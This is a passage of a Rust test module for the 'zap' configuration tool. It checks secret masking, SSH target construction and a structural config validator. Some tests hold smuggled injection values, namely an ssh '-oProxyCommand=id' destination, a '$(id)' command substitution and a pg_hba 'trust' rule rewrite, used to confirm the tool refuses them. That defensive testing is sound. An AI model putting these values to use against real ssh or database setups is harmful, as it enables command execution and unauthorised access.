//! Tests of what the commands share: the detection pass and its report, the structure
//! gate, the connection a target resolves to, and the shared renders.

use std::path::Path;

use super::detect_pass::pending_triggers;
use super::target::build_ssh;
use super::{
    PassContext, detect_and_diff, detect_pass, unresolved_env_message, validate_config_structure,
};
use crate::connection::{Connection, MockConnection};
use crate::error::Error;
use crate::last_run::read_last_run;
use crate::resource::Markers;
use crate::resource::pending::read_query;
use crate::secret::SecretMasker;
use crate::test_support::local_machine;
use zap_types::last_run::{RunCommand, Verdict};
use zap_types::observe::{CommandObservation, Observation};
use zap_types::plan::{HeldResource, HoldCause, TriggerKind};
use zap_types::schema::{Target, ZapConfig};
use zap_types::text::Text;
use zap_types::var_ref::Segment::{Ref, Text as Lit};
use zap_types::var_ref::shown;

pub(super) use super::test_fgro::{available as fgro_available, fgro};

fn with_trigger() -> ZapConfig {
    config(&serde_json::json!([
        {"id": "site", "type": "file", "path": "/etc/nginx/site",
         "content": {"type": "inline", "content": ""}},
        {"id": "web", "type": "service", "service": "nginx", "enabled": true,
         "reload_on": ["site"]},
    ]))
}

/// A host or user behind a secret makes its plan unbindable, and the reason names
/// the variable and the way out for its own cause: `zap.unmask` for one that only
/// reads as a secret — by its name, or by the form of its value — and never for one
/// the config itself made a secret.
#[test]
fn an_unbindable_reason_names_the_variable_and_its_own_remedy() {
    use super::resolve_machine;
    use crate::secret::build_validated_masker;

    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": Text::reference("ZAP_T_HOST"), "user": Text::reference("ZAP_T_USER")},
        "mask_vars": ["ZAP_T_DECLARED"],
        "resources": [{"id": "f", "type": "file", "path": "/opt/f",
                       "content": {"type": "remote", "url": "https://x.example/f",
                                   "blake3": "ab".repeat(32),
                                   "auth": {"scheme": "bearer",
                                            "token": Text::reference("ZAP_T_PAT")}}}],
    }))
    .unwrap();
    let with_host = |name: &str| {
        let mut config = config.clone();
        config.target = serde_json::from_value(serde_json::json!({
            "host": Text::reference(name), "user": Text::reference("ZAP_T_USER"),
        }))
        .unwrap();
        config
    };
    let reason = |config: &ZapConfig, env: &[(&str, &str)]| {
        let _env = crate::resolve::test_env::set(env);
        let masker = build_validated_masker(config, crate::resolve::env_var).unwrap();
        resolve_machine(config, &masker, false).unwrap().unbindable
    };
    let plain = [("ZAP_T_HOST", "h.example"), ("ZAP_T_USER", "deploy")];
    assert_eq!(reason(&config, &plain), None);

    // By the form of its value: a host that is a URL holding a password names no
    // machine, and the plan is refused with the variable and `unmask` named — the
    // password itself nowhere in the reason.
    let shaped = reason(
        &config,
        &[
            ("ZAP_T_HOST", "ssh://deploy:hunter2@h.example"),
            ("ZAP_T_USER", "deploy"),
        ],
    )
    .unwrap();
    assert!(
        shaped.starts_with(&format!(
            "the target host `{host}` references `{host}`, whose value is a URL holding a \
             password (call `zap.unmask('ZAP_T_HOST')` if it is not a secret, or declare \
             the value literally)",
            host = shown("ZAP_T_HOST")
        )),
        "{shaped}"
    );
    assert!(!shaped.contains("hunter2"), "{shaped}");

    // By its name.
    let named = reason(
        &with_host("ZAP_T_HOST_KEY"),
        &[("ZAP_T_HOST_KEY", "h.example"), ("ZAP_T_USER", "deploy")],
    )
    .unwrap();
    assert!(
        named.contains("a secret name (call `zap.unmask('ZAP_T_HOST_KEY')` if it is not a secret"),
        "{named}"
    );

    // By the config's own statement: no `unmask` is offered.
    let declared = reason(
        &with_host("ZAP_T_DECLARED"),
        &[("ZAP_T_DECLARED", "h.example"), ("ZAP_T_USER", "deploy")],
    )
    .unwrap();
    assert!(
        declared
            .contains("which the config declares a secret (drop its `zap.mask('ZAP_T_DECLARED')`")
            && !declared.contains("zap.unmask"),
        "{declared}"
    );
    // Declared, under a name that reads as a secret's as well: dropping the `mask`
    // alone would only change the reason, so the remedy is the `unmask`.
    let mut both = with_host("ZAP_T_HOST_KEY");
    both.mask_vars = Some(vec![
        zap_types::scalar::EnvVarName::new("ZAP_T_HOST_KEY").unwrap(),
    ]);
    let both = reason(
        &both,
        &[("ZAP_T_HOST_KEY", "h.example"), ("ZAP_T_USER", "deploy")],
    )
    .unwrap();
    assert!(
        both.contains(
            "which the config declares a secret and whose name reads as one too (if it \
             is not a secret, replace its `zap.mask('ZAP_T_HOST_KEY')` with \
             `zap.unmask('ZAP_T_HOST_KEY')`"
        ),
        "{both}"
    );
    let credential = reason(
        &with_host("ZAP_T_PAT"),
        &[("ZAP_T_PAT", "h.example"), ("ZAP_T_USER", "deploy")],
    )
    .unwrap();
    assert!(
        credential.contains("which the config also uses as a fetch credential")
            && !credential.contains("zap.unmask"),
        "{credential}"
    );
}

/// Markers are matched to this config's services by unit name; one no service here
/// manages becomes a warning.
#[test]
fn pending_triggers_matches_markers_to_services_and_flags_orphans() {
    let markers = [
        ("nginx".to_owned(), TriggerKind::Reload),
        ("old-app".to_owned(), TriggerKind::Restart),
    ]
    .into();
    let (pending, orphans) = pending_triggers(&with_trigger(), markers);
    assert_eq!(pending.get("nginx"), Some(&TriggerKind::Reload));
    assert_eq!(pending.len(), 1);
    assert_eq!(orphans.len(), 1);
    assert!(
        orphans[0].contains("pending restart of `old-app`"),
        "{}",
        orphans[0]
    );
}

/// The marker read rides the detection pass — one query among the pass's, read only
/// when the config declares a trigger — and a failed read still fails the command.
#[tokio::test]
async fn the_marker_read_rides_the_detection_pass_only_when_a_trigger_is_declared() {
    let markers = |code: i32, stdout: &str| {
        Observation::Command(CommandObservation {
            code,
            stdout: stdout.as_bytes().to_vec(),
            stderr: b"denied\n".to_vec(),
        })
    };
    let mock =
        MockConnection::new("m").with_observation(read_query(), markers(0, "old-app restart\n"));
    let conn = Connection::Mock(mock.clone());
    let result = detect_and_diff(
        &conn,
        &with_trigger(),
        untracked(),
        &machine(&with_trigger()),
        None,
        RunCommand::Plan,
    )
    .await
    .unwrap()
    .result;
    assert!(mock.issued_queries().contains(&read_query()));
    assert!(
        result
            .warnings
            .iter()
            .any(|w| w.contains("pending restart of `old-app`")),
        "{:?}",
        result.warnings
    );

    let failing =
        Connection::Mock(MockConnection::new("m").with_observation(read_query(), markers(1, "")));
    assert!(matches!(
        detect_and_diff(&failing, &with_trigger(), untracked(), &machine(&with_trigger()), None, RunCommand::Plan).await,
        Err(Error::ReadFile { cause, .. }) if cause.to_string() == "denied"
    ));

    // No trigger declared: no read.
    let without = config(&serde_json::json!([
        {"id": "web", "type": "service", "service": "nginx", "enabled": true},
    ]));
    let mock = MockConnection::new("m");
    let conn = Connection::Mock(mock.clone());
    detect_and_diff(
        &conn,
        &without,
        untracked(),
        &machine(&without),
        None,
        RunCommand::Plan,
    )
    .await
    .unwrap();
    assert!(!mock.issued_queries().contains(&read_query()));
}

/// `config`'s machine as a run connecting as the primary user resolves it.
fn machine(config: &ZapConfig) -> super::ResolvedMachine {
    super::resolve_machine(config, no_secrets(), false).unwrap()
}

/// An unreachable target whose host and connecting user are secret references:
/// `plan`, `detect` and a dry `apply` each fail with the connection error, and what it
/// prints holds neither value — not in zap's own `ssh://user@host` label, and not in
/// what `ssh` said. Entered where a command is once its config is evaluated, through
/// the gates and the bind `eval_target` runs, so the masker is the run's own. One
/// pass has a resource to read (the failure is a detection batch's) and one has none
/// (it is the connectivity check's).
#[tokio::test]
async fn a_connection_error_names_a_secret_host_and_user_by_token() {
    use super::refused_target::{RefusedTarget, assert_masked};
    use crate::commands::apply::{ApplyOptions, apply_over};
    use crate::commands::detect::detect_over;
    use crate::commands::plan::plan_over;

    let directory = serde_json::json!([{"id": "d", "type": "directory", "path": "/srv/d"}]);
    for resources in [directory, serde_json::json!([])] {
        let refused = RefusedTarget::new(&resources);
        let planned = plan_over(&refused.conn, &refused.config, refused.ctx()).await;
        assert_masked("plan", &planned.unwrap_err());
        let detected = detect_over(&refused.conn, &refused.config, refused.ctx()).await;
        assert_masked("detect", &detected.unwrap_err());
        let applied = apply_over(
            &refused.conn,
            &refused.config,
            refused.ctx(),
            ApplyOptions::default(),
        )
        .await;
        assert_masked("apply", &applied.unwrap_err());
    }
}

/// A masker with nothing registered, for the life of the test run.
fn no_secrets() -> &'static SecretMasker {
    static MASKER: std::sync::OnceLock<SecretMasker> = std::sync::OnceLock::new();
    MASKER.get_or_init(|| crate::secret::SecretRegistry::new().freeze().unwrap())
}

/// A pending-marker read that answers `code` — a failing one fails the pass.
fn marker_read(code: i32) -> MockConnection {
    MockConnection::new("m").with_observation(
        read_query(),
        Observation::Command(CommandObservation {
            code,
            stdout: Vec::new(),
            stderr: b"denied\n".to_vec(),
        }),
    )
}

/// A pass recording under `home`.
fn recording<'a>(home: &'a Path, config_path: &'a Path) -> PassContext<'a> {
    PassContext {
        zap_home: Some(home),
        config_path,
        masker: no_secrets(),
        bootstrap: false,
    }
}

/// A pass that fails writes no report — so a wetrun whose re-detection fails leaves
/// the report its pre-change pass wrote, and a first pass that fails leaves none. (A
/// pass that can't reach the target fails the same way, before any verdict exists.)
#[tokio::test]
async fn a_failed_pass_writes_no_report() {
    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let config = with_trigger();
    let pass = |conn: MockConnection, command| {
        let config = &config;
        let config_path = &config_path;
        let home = home.path();
        async move {
            detect_pass(
                &Connection::Mock(conn),
                config,
                recording(home, config_path),
                &machine(config),
                None,
                Markers::Read,
                command,
            )
            .await
        }
    };
    assert!(pass(marker_read(1), RunCommand::Detect).await.is_err());
    assert_eq!(read_last_run(home.path(), &config_path, "local"), None);

    pass(marker_read(0), RunCommand::ApplyBeforeChanges)
        .await
        .unwrap();
    assert!(
        pass(marker_read(1), RunCommand::ApplyAfterChanges)
            .await
            .is_err()
    );
    let last = read_last_run(home.path(), &config_path, "local").unwrap();
    assert_eq!(last.command, RunCommand::ApplyBeforeChanges);

    // A re-detection that runs replaces it.
    pass(marker_read(0), RunCommand::ApplyAfterChanges)
        .await
        .unwrap();
    let last = read_last_run(home.path(), &config_path, "local").unwrap();
    assert_eq!(last.command, RunCommand::ApplyAfterChanges);
}

/// A pass whose comparison referenced an unset variable records its name, so
/// `status` can't present the verdicts as evidence.
#[tokio::test]
async fn a_pass_records_its_unverifiable_references() {
    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let config = config(&serde_json::json!([
        {"id": "probe", "type": "directory",
         "path": Text::of_pieces([Lit("/tmp/"), Ref("ZAP_TEST_UNSET_PROBE_APP")])},
    ]));
    detect_pass(
        &Connection::Mock(MockConnection::new("m")),
        &config,
        recording(home.path(), &config_path),
        &machine(&config),
        None,
        Markers::Skip,
        RunCommand::Plan,
    )
    .await
    .unwrap();
    let last = read_last_run(home.path(), &config_path, "local").unwrap();
    assert_eq!(last.unverifiable, ["ZAP_TEST_UNSET_PROBE_APP"]);
    assert_eq!(last.command, RunCommand::Plan);
}

/// The report folds only the pins `zap.lock` holds on disk — never one a dry run
/// resolved in memory — so `status`'s recompute agrees with it.
#[tokio::test]
async fn the_report_folds_only_on_disk_pins() {
    use zap_types::lock::{LockEntry, ZapLock};
    use zap_types::scalar::ContentHash;

    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let config = config(&serde_json::json!([
        {"id": "blob", "type": "file", "path": "/opt/blob",
         "content": {"type": "remote", "url": "https://x/blob", "extract": {"type": "none"}}},
    ]));
    let mut in_memory = ZapLock::default();
    in_memory.entries.insert(
        zap_types::schema::ResourceId("blob".to_owned()),
        LockEntry::RemoteFile {
            config_hash: String::new(),
            blake3: ContentHash::new("a".repeat(64)).unwrap(),
        },
    );
    detect_pass(
        &Connection::Mock(MockConnection::new("m")),
        &config,
        recording(home.path(), &config_path),
        &machine(&config),
        Some(&in_memory),
        Markers::Skip,
        RunCommand::Apply,
    )
    .await
    .unwrap();
    let last = read_last_run(home.path(), &config_path, "local").unwrap();
    let recorded = &last.resources[&zap_types::schema::ResourceId("blob".to_owned())];
    let var = crate::last_run::report_var_with(&config, no_secrets(), |_| None);
    let unpinned = zap_types::last_run::desired_hash(&config.resources[0], &var, None)
        .unwrap()
        .hash;
    assert_eq!(recorded.desired_hash.as_deref(), Some(unpinned.as_str()));
    assert_eq!(recorded.verdict, Verdict::Undetermined);
}

/// A pass with no `~/.zap`: no content cache, no last-run report.
fn untracked() -> PassContext<'static> {
    PassContext {
        zap_home: None,
        config_path: Path::new("zap.ts"),
        masker: no_secrets(),
        bootstrap: false,
    }
}

fn config(resources: &serde_json::Value) -> ZapConfig {
    serde_json::from_value(serde_json::json!({
        "target": {"local": true, "service_manager": "systemd"},
        "resources": resources,
    }))
    .unwrap()
}

/// A remote target from a literal-value wire object (no reference, so the test stays
/// hermetic — `resolve_env_vars` passes a literal through unchanged).
fn remote_target(wire: serde_json::Value) -> Target {
    serde_json::from_value(wire).unwrap()
}

#[test]
fn build_ssh_selects_the_primary_user_by_default() {
    // `bootstrap = false`: the connecting user is the primary `user`.
    let target = remote_target(serde_json::json!({
        "host": "example.com", "user": "deploy", "bootstrap_user": "root",
    }));
    let conn = build_ssh(&target, false).unwrap();
    assert_eq!(conn.host, "example.com");
    assert_eq!(conn.user, "deploy");
}

#[test]
fn build_ssh_selects_the_bootstrap_user_when_requested() {
    // `bootstrap = true`: the connecting user is `bootstrap_user`, not `user`.
    let target = remote_target(serde_json::json!({
        "host": "example.com", "user": "deploy", "bootstrap_user": "root",
    }));
    let conn = build_ssh(&target, true).unwrap();
    assert_eq!(conn.host, "example.com");
    assert_eq!(conn.user, "root");
}

/// A remote target with no host to connect to is refused before a connection is
/// built, exit 2, and the message is true of the config it is about: no `host`
/// declared, one declared empty, or one whose references resolve to nothing here —
/// shown as written, the variables named.
#[test]
#[allow(clippy::literal_string_with_formatting_args)]
fn build_ssh_says_why_a_target_names_no_host() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_EMPTY_HOST", "")]);
    for (target, expected) in [
        (
            serde_json::json!({"local": false, "user": "deploy"}),
            "remote target declares no `host` (set `target.host`, or `target.local: true`)",
        ),
        (
            serde_json::json!({"host": "", "user": "deploy"}),
            "the target's `host` is empty (set `target.host`, or `target.local: true`)",
        ),
        (
            serde_json::json!({"host": {"$env": "ZAP_T_UNSET_HOST"}}),
            "the target's `host` is declared as {env:ZAP_T_UNSET_HOST} and resolves to \
             nothing: {env:ZAP_T_UNSET_HOST} unset or empty in the environment — set \
             what it references and re-run",
        ),
        (
            serde_json::json!({"host": {"$text": [
                {"$env": "ZAP_T_UNSET_HOST"}, {"$env": "ZAP_T_EMPTY_HOST"},
            ]}}),
            "the target's `host` is declared as {env:ZAP_T_UNSET_HOST}{env:ZAP_T_EMPTY_HOST} \
             and resolves to nothing: {env:ZAP_T_UNSET_HOST}, {env:ZAP_T_EMPTY_HOST} unset \
             or empty in the environment — set what it references and re-run",
        ),
    ] {
        let target = remote_target(target);
        let error = build_ssh(&target, false).unwrap_err();
        assert_eq!(error.exit_code(), 2, "{error}");
        assert_eq!(error.to_string(), format!("invalid config: {expected}"));
    }
}

/// A path whose reference resolves to a value holding a reference delimiter holds
/// that one resource, the variable named; the pass goes on, and every other resource
/// is read. A `database` whose `pg_hba` host resolves to one holds the same way.
#[tokio::test]
#[allow(clippy::literal_string_with_formatting_args)]
async fn a_value_holding_a_delimiter_holds_its_resource_by_name_and_no_other() {
    use crate::commands::plan::{plan_over, render_plan};
    use zap_types::detected::Detection;
    use zap_types::observe::{FileKind, PathFacet, PathObservation, Privilege, Query};
    use zap_types::schema::ResourceId;
    use zap_types::var_ref::{CLOSE, OPEN};

    let value = format!("/srv/{OPEN}X{CLOSE}/d");
    let _env = crate::resolve::test_env::set(&[("ZAP_T_ZP", &value)]);
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": "h.example", "user": "deploy", "service_manager": "systemd"},
        "resources": [
            {"id": "bad", "type": "directory", "path": {"$env": "ZAP_T_ZP"}},
            {"id": "db", "type": "database", "engine": "postgresql", "username": "app",
             "database_name": "app", "auth": {"hosts": [{"$env": "ZAP_T_ZP"}]}},
            {"id": "good", "type": "directory", "path": "/srv/good"},
        ],
    }))
    .unwrap();
    let good = Query::Path {
        path: "/srv/good".to_owned(),
        facet: PathFacet::Kind,
        privilege: Privilege::Login,
    };
    let mock = MockConnection::new("h.example")
        .with_user("deploy")
        .with_observation(
            good.clone(),
            Observation::Path(PathObservation::Kind(FileKind::Directory)),
        );
    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let report = plan_over(
        &Connection::Mock(mock.clone()),
        &config,
        recording(home.path(), &config_path),
    )
    .await
    .unwrap();

    assert_eq!(report.exit_code(), 1);
    let described: Vec<String> = report.held.iter().map(HeldResource::describe).collect();
    let held: Vec<(&str, &str)> = report
        .held
        .iter()
        .zip(&described)
        .map(|(held, described)| (held.resource_id.0.as_str(), described.as_str()))
        .collect();
    assert_eq!(
        held,
        [
            (
                "bad",
                "`{env:ZAP_T_ZP}` resolves to a value containing a reference delimiter \
                 (U+FDD0 or U+FDD1), which zap won't use as a path or a name on the target"
            ),
            (
                "db",
                "detection failed: auth.hosts: `{env:ZAP_T_ZP}` resolves to a value \
                 containing a reference delimiter (U+FDD0 or U+FDD1), which zap won't use \
                 as a path or a name on the target"
            ),
        ]
    );
    assert_eq!(mock.issued_queries(), [good]);
    assert_eq!(
        report.detected.get(&ResourceId("good".to_owned())),
        Some(&Detection::Converged)
    );
    let rendered = render_plan(&report);
    assert!(rendered.contains("`{env:ZAP_T_ZP}` resolves"), "{rendered}");
    assert!(!rendered.contains([OPEN, CLOSE]), "{rendered:?}");
}

/// A reference that resolves to a value its field can't be — a path that isn't
/// absolute, an option where a link's target goes, a `pg_hba` field that would
/// rewrite its rule — holds that one resource, naming the field and never the value;
/// every other resource is read.
#[tokio::test]
async fn a_value_its_field_cannot_be_holds_its_resource_by_field_and_no_other() {
    use crate::commands::plan::{plan_over, render_plan};
    use zap_types::detected::Detection;
    use zap_types::observe::{FileKind, PathFacet, PathObservation, Privilege, Query};
    use zap_types::schema::ResourceId;

    let _env = crate::resolve::test_env::set(&[
        ("ZAP_T_REL_SECRET", "relative/secret-dir"),
        ("ZAP_T_OPTION_TOKEN", "-t/etc/cron.d/secret"),
        ("ZAP_T_ROLE_PASSWORD", "all"),
        ("ZAP_T_NET_KEY", "0.0.0.0/0 trust #secret"),
        ("ZAP_T_LINES_SECRET", "/srv/secret\n/etc"),
    ]);
    let reference = |name: &str| serde_json::json!({"$env": name});
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": "h.example", "user": "deploy", "service_manager": "systemd"},
        "resources": [
            {"id": "a-rel", "type": "directory", "path": reference("ZAP_T_REL_SECRET")},
            {"id": "b-lines", "type": "file", "path": reference("ZAP_T_LINES_SECRET"),
             "content": {"type": "inline", "content": "x"}},
            {"id": "c-link", "type": "link", "path": "/srv/current",
             "target": reference("ZAP_T_OPTION_TOKEN")},
            {"id": "d-role", "type": "database", "engine": "postgresql",
             "username": reference("ZAP_T_ROLE_PASSWORD"), "database_name": "app"},
            {"id": "e-net", "type": "database", "engine": "postgresql", "username": "app",
             "database_name": "other", "auth": {"hosts": [reference("ZAP_T_NET_KEY")]}},
            {"id": "good", "type": "directory", "path": "/srv/good"},
        ],
    }))
    .unwrap();
    validate_config_structure(&config).unwrap();
    let good = Query::Path {
        path: "/srv/good".to_owned(),
        facet: PathFacet::Kind,
        privilege: Privilege::Login,
    };
    let mock = MockConnection::new("h.example")
        .with_user("deploy")
        .with_observation(
            good.clone(),
            Observation::Path(PathObservation::Kind(FileKind::Directory)),
        );
    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let report = plan_over(
        &Connection::Mock(mock.clone()),
        &config,
        recording(home.path(), &config_path),
    )
    .await
    .unwrap();

    assert_eq!(report.exit_code(), 1);
    let described: Vec<String> = report.held.iter().map(HeldResource::describe).collect();
    let held: Vec<(&str, &str)> = report
        .held
        .iter()
        .zip(&described)
        .map(|(held, described)| (held.resource_id.0.as_str(), described.as_str()))
        .collect();
    assert_eq!(
        held,
        [
            (
                "a-rel",
                "`path` resolves to a value that is not an absolute path; write the full \
                 path, from `/`"
            ),
            (
                "b-lines",
                "`path` resolves to a value that holds a control character (a line break \
                 and a tab are each one); the field is one line of text"
            ),
            (
                "c-link",
                "`target` resolves to a value that begins with `-`, which the command it \
                 is handed to would read as an option"
            ),
            (
                "d-role",
                "`username` resolves to a value that is `all`, which `pg_hba.conf` reads as \
                 a keyword in its user column — every role — not a role's name"
            ),
            (
                "e-net",
                "`auth.hosts[0]` resolves to a value that holds a character that changes what a `pg_hba.conf` rule line means \
                 (whitespace, `#`, `\"`, `,`, or a control character)"
            ),
        ]
    );
    assert_eq!(mock.issued_queries(), [good]);
    assert_eq!(
        report.detected.get(&ResourceId("good".to_owned())),
        Some(&Detection::Converged)
    );
    let rendered = render_plan(&report);
    assert!(!rendered.contains("secret"), "{rendered}");
    assert!(!rendered.contains("cron.d"), "{rendered}");
    assert!(!rendered.contains("0.0.0.0"), "{rendered}");
}

/// The structural gate holds a config's names, strings, numbers and target: each
/// rule's finding is in the one error, before anything is read.
#[test]
fn the_structure_gate_holds_names_strings_and_the_target() {
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"service_manager": "systemd"},
        "resources": [
            {"id": "x$(id)", "type": "script", "check": "", "run": "r"},
            {"id": "d", "type": "directory", "path": "srv"},
            {"id": "db", "type": "database", "engine": "postgresql",
             "database_name": "app", "username": "app",
             "auth": {"hosts": ["0.0.0.0/0 trust #"]}},
        ],
        "deploy": {"artifacts": ["build/"], "path": "/srv/app", "releases": 1},
    }))
    .unwrap();
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    assert!(
        message.starts_with("config has 6 structural error(s):\n"),
        "{message}"
    );
    for finding in [
        "\n  - resource 1: `id` (`x$(id)`) is not a name zap can use for a resource",
        "\n  - the target declares no `host`;",
        "\n  - resource `x$(id)`: `check` is blank (empty, or only whitespace); an empty \
         command succeeds",
        "\n  - resource `d`: `path` is not an absolute path;",
        "\n  - resource `db`: `auth.hosts[0]` holds a character that changes what a \
         `pg_hba.conf` rule line means",
        "\n  - `deploy.releases` is 1;",
    ] {
        assert!(message.contains(finding), "{finding}\n  not in: {message}");
    }
}

/// The structural gate holds what two resources both manage and a template whose
/// placeholders and variables don't match: each is a finding of the one error.
#[test]
fn the_structure_gate_holds_claims_and_template_variables() {
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": "h.example"},
        "resources": [
            {"id": "one", "type": "directory", "path": "/srv/shared"},
            {"id": "two", "type": "directory", "path": "/srv/shared/"},
            {"id": "conf", "type": "file", "path": "/etc/conf",
             "content": {"type": "template", "template": "port={{port}}\n",
                         "vars": {"prot": 8080}}},
        ],
    }))
    .unwrap();
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    for finding in [
        "\n  - resources `one` and `two` each manage the path `/srv/shared`;",
        "\n  - resource `conf`: `content.template` holds the placeholder `{{port}}`, and \
         `content.vars` has no `port`;",
        "\n  - resource `conf`: `content.vars.prot` is used nowhere:",
    ] {
        assert!(message.contains(finding), "{finding}\n  not in: {message}");
    }
}

/// The structural gate refuses a `user` named `root`: zap manages a user's home as
/// `/home/<name>`, and root's is `/root`.
#[test]
fn the_structure_gate_refuses_a_root_user() {
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": "h.example"},
        "resources": [
            {"id": "admin", "type": "user", "username": "root", "home_mode": "700"},
        ],
    }))
    .unwrap();
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    assert!(
        message.contains(
            "\n  - user `admin` declares `username: 'root'`, whose home is /root, but zap \
             manages a user's home as /home/<name>"
        ),
        "{message}"
    );
}

/// The structural gate refuses a pipeline whose steps repeat an id.
#[test]
fn the_structure_gate_refuses_a_repeated_pipeline_step_id() {
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": "h.example"},
        "resources": [
            {"id": "migrate", "type": "pipeline", "steps": [
                {"id": "step", "run": "./backup.sh"},
                {"id": "step", "run": "./migrate.sh"},
            ]},
        ],
    }))
    .unwrap();
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    assert!(
        message.contains(
            "\n  - pipeline `migrate` has more than one step with the id `step`; each step's \
             id must be unique within its pipeline"
        ),
        "{message}"
    );
}

/// The structural gate holds a trigger on a service kept stopped and a resource in zap's
/// own state directory.
#[test]
fn the_structure_gate_holds_stopped_triggers_and_zaps_state_directory() {
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": "h.example", "service_manager": "systemd"},
        "resources": [
            {"id": "conf", "type": "file", "path": "/etc/conf",
             "content": {"type": "inline", "content": ""}, "triggers": ["svc"]},
            {"id": "svc", "type": "service", "service": "svc", "running": false},
            {"id": "state", "type": "directory", "path": "/var/lib/zap"},
        ],
    }))
    .unwrap();
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    for finding in [
        "\n  - file `conf` triggers service `svc`, which sets `running: false`:",
        "\n  - resource `state` manages the path `/var/lib/zap`, which is at or under",
    ] {
        assert!(message.contains(finding), "{finding}\n  not in: {message}");
    }
}

/// A declared connecting user that resolves to nothing is refused before a
/// connection is built — `ssh` would otherwise pick the account — and the message
/// names the field the run selected and its variables. A target that declares no
/// user connects as `ssh` chooses, by the config's own word.
#[test]
#[allow(clippy::literal_string_with_formatting_args)]
fn build_ssh_refuses_a_declared_user_that_resolves_to_nothing() {
    let _env =
        crate::resolve::test_env::set(&[("ZAP_T_EMPTY_USER", ""), ("ZAP_T_SET_USER", "deploy")]);
    let target = remote_target(serde_json::json!({
        "host": "example.com",
        "user": {"$env": "ZAP_T_EMPTY_USER"},
        "bootstrap_user": {"$text": [
            {"$env": "ZAP_T_UNSET_BOOT_A"}, {"$env": "ZAP_T_UNSET_BOOT_B"},
        ]},
    }));
    for (bootstrap, expected) in [
        (
            false,
            "the target's `user` is declared as {env:ZAP_T_EMPTY_USER} and resolves to \
             nothing: {env:ZAP_T_EMPTY_USER} unset or empty in the environment — set \
             what it references and re-run (with no user `ssh` would connect as an \
             account of its own choosing, not the one the config names)",
        ),
        (
            true,
            "the target's `bootstrap_user` is declared as \
             {env:ZAP_T_UNSET_BOOT_A}{env:ZAP_T_UNSET_BOOT_B} and resolves to nothing: \
             {env:ZAP_T_UNSET_BOOT_A}, {env:ZAP_T_UNSET_BOOT_B} unset or empty in the \
             environment — set what it references and re-run (with no user `ssh` would \
             connect as an account of its own choosing, not the one the config names)",
        ),
    ] {
        match build_ssh(&target, bootstrap) {
            Err(Error::Config(message)) => assert_eq!(message, expected),
            other => panic!("expected a config error, got {other:?}"),
        }
    }
    // An empty literal is told what its own field is for: a `user` may be left out,
    // a `bootstrap_user` a `--bootstrap` run selected may not.
    let blank = remote_target(serde_json::json!({
        "host": "example.com", "user": "", "bootstrap_user": "",
    }));
    for (bootstrap, expected) in [
        (
            false,
            "the target's `user` is empty (name the account, or leave it out)",
        ),
        (
            true,
            "the target's `bootstrap_user` is empty (name the account a `--bootstrap` \
             run connects as)",
        ),
    ] {
        match build_ssh(&blank, bootstrap) {
            Err(Error::Config(message)) => assert_eq!(message, expected),
            other => panic!("expected a config error, got {other:?}"),
        }
    }
    // The unselected user's reference stops nothing here.
    let primary_set = remote_target(serde_json::json!({
        "host": "example.com",
        "user": {"$env": "ZAP_T_SET_USER"},
        "bootstrap_user": {"$env": "ZAP_T_UNSET_BOOT_A"},
    }));
    assert_eq!(build_ssh(&primary_set, false).unwrap().user, "deploy");
    // No user declared: the destination is the bare host.
    let none = remote_target(serde_json::json!({"host": "example.com"}));
    assert_eq!(build_ssh(&none, false).unwrap().user, "");
}

#[test]
fn build_ssh_bootstrap_without_a_bootstrap_user_errors() {
    // `--bootstrap` with no declared `bootstrap_user` is an explicit config error —
    // never a silent fallback to the primary `user`.
    let target = remote_target(serde_json::json!({
        "host": "example.com", "user": "deploy",
    }));
    let Err(Error::Config(message)) = build_ssh(&target, true) else {
        panic!("expected an Error::Config for --bootstrap with no bootstrap_user");
    };
    assert!(message.contains("bootstrap_user"), "{message}");
}

#[test]
fn build_ssh_refuses_a_destination_ssh_would_read_as_an_option() {
    // The destination is one `ssh` argument; led by `-`, `ssh` would parse it as
    // options — whether the value is declared or comes from a reference.
    let _env = crate::resolve::test_env::set(&[("ZAP_T_OPTION", "-oProxyCommand=id")]);
    for option in [
        Text::literal("-oProxyCommand=id"),
        Text::reference("ZAP_T_OPTION"),
    ] {
        for bootstrap in [false, true] {
            let (user, bootstrap_user) = if bootstrap {
                (Text::literal("deploy"), option.clone())
            } else {
                (option.clone(), Text::literal("root"))
            };
            let target = remote_target(serde_json::json!({
                "host": "example.com",
                "user": user,
                "bootstrap_user": bootstrap_user,
            }));
            let Err(Error::Config(message)) = build_ssh(&target, bootstrap) else {
                panic!("expected an Error::Config for a user starting with `-`");
            };
            assert!(message.contains("connecting user"), "{message}");
            assert!(message.contains("starting with `-`"), "{message}");
            assert!(!message.contains("ProxyCommand"), "{message}");
        }
        // With no user declared the host leads the argument.
        let target = remote_target(serde_json::json!({"host": option}));
        let Err(Error::Config(message)) = build_ssh(&target, false) else {
            panic!("expected an Error::Config for a host starting with `-`");
        };
        assert!(message.contains("target's host"), "{message}");
    }
    // A declared user and a plain host bind; so does a host alone.
    let bare = remote_target(serde_json::json!({"host": "example.com"}));
    assert_eq!(build_ssh(&bare, false).unwrap().user, "");
}

/// The destination names the account and the machine the plan names, and no other:
/// a host that carries an account of its own (`ssh` reads what precedes the last
/// `@` as the user, and an `ssh://` form a port too), and a user that would end
